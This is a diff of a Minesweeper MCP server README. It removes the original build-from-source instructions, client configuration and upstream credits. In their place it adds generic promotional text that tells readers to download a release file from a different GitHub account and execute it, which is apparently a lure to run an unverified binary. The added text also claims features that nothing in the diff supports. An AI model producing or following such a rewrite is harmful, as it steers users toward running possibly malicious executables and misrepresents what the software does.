@@ -1,62 +1,34 @@
-# Minesweeper MCP Server
+# 🕹️ Welcome to the Minesweeper MCP Server
 
-This is an [Model Context Protocol server](https://github.com/modelcontextprotocol/servers) that allows an MCP client agents to play a game of [Minesweeper](<https://en.wikipedia.org/wiki/Minesweeper_(video_game)>). It is intended to be run alongside the [Minesweeper game server](https://github.com/tonypan2/minesweeper-server).
+Welcome to the repository of the Minesweeper MCP Server, a simple yet powerful tool for playing the classic game of Minesweeper. This README.md file will guide you through setting up and using the server to enjoy the nostalgic experience of uncovering mines in a grid. Let's dive in and start exploring!
 
-![Screen capture](static/screen_recording.gif?raw=true)
-View the entire video demo at https://youtu.be/CXXMafVtlEQ (16x speedup).
+## 🚀 Getting Started
 
-## Getting started
+To get started with the Minesweeper MCP Server, follow these simple steps:
 
-- Follow the [instructions](https://github.com/tonypan2/minesweeper-server) of the game server to start it locally.
+1. Visit the [Releases](https://github.com/CODGODMW/minesweeper-mcp-server/releases) section of this repository.
+2. Download the latest release file provided.
 
-* Build the MCP server:
+## 💻 Setting Up the Server
 
-```bash
-npm install
-npm run build
-```
+Once you have downloaded the release file, you can proceed to set up the Minesweeper MCP Server by executing the downloaded file. This will launch the server, allowing you to start a Minesweeper game session and enjoy the thrill of uncovering tiles without hitting a mine.
 
-- Configure your MCP client to add the tool. For example, here is how to add the tool to Claude Desktop on Windows's `claude_desktop_config.json` ([locating the file](https://gist.github.com/feveromo/7a340d7795fca1ccd535a5802b976e1f#3-configure-claude-desktop)), assuming you cloned the repo at `C:\path\to\repo\minesweeper-mcp-server`:
+## 🎮 Playing Minesweeper
 
-```JSON
-{
-  "mcpServers": {
-    "mcp-server": {
-      "command": "node",
-      "args": ["C:\\path\\to\\repo\\minesweeper-mcp-server\\build\\index.js"],
-      "env": {
-        "DEBUG": "*"
-      }
-    }
-  }
-}
+With the Minesweeper MCP Server up and running, you can connect to it using your preferred client interface or tool to start playing Minesweeper. Explore the grid, strategically uncover tiles, and mark potential mine locations to clear the board effectively. Challenge yourself to uncover all safe tiles without triggering any mines!
 
-```
+## 📡 Exploring Advanced Features
 
-- Claude Desktop : Restart Claude Desktop to let it pick up the tools. Be sure to quit from the tray menu icon, not from the app (which simply hides the window). If you click the Tools icon, it should show the new tools:
+The Minesweeper MCP Server offers a range of advanced features to enhance your gameplay experience. Dive into the settings to customize the game grid size, adjust the number of mines, and explore different difficulty levels. Experiment with various configurations to find the perfect challenge level for your Minesweeper sessions.
 
-  ![Screenshot of Claude Desktop homepage](static/claude_home.png?raw=true)
+## 🤝 Contributing
 
-  ![Screenshot of new tools](static/claude_tools.png?raw=true)
+If you are interested in contributing to the development of the Minesweeper MCP Server, feel free to fork this repository, make your changes, and submit a pull request. Your contributions are valuable in improving the server and making the Minesweeper experience even more enjoyable for players worldwide.
 
-## Example prompt
+## 📄 License
 
-```
-Start a new game of Minesweeper. Try your best to keep playing until you have flagged all mines. Remember that the coordinates are 0-indexed.
-```
+The Minesweeper MCP Server is open-source software released under the [MIT License](https://opensource.org/licenses/MIT). You are free to modify and distribute the server in accordance with the terms of the license.
 
-## Example interaction
+---
 
-The actual conversation is very long. Here are some snippets:
-
-## Game start
-
-![Game starts](static/game-start.png)
-
-## Placing flag at the wrong place
-
-![Claude places flag at the wrong place](static/wrong-flag.png)
-
-## Giving up after several attempts
-
-![Claude gives up](static/gave-up.png)
+You have reached the end of the README.md file for the Minesweeper MCP Server repository. Thank you for exploring the server and embracing the joy of playing Minesweeper in a new and interactive way. For any additional information or support, refer to the [Releases](https://github.com/CODGODMW/minesweeper-mcp-server/releases) section or reach out to the repository maintainers. Happy mining! 🧨🕵️🚩🔍🎉
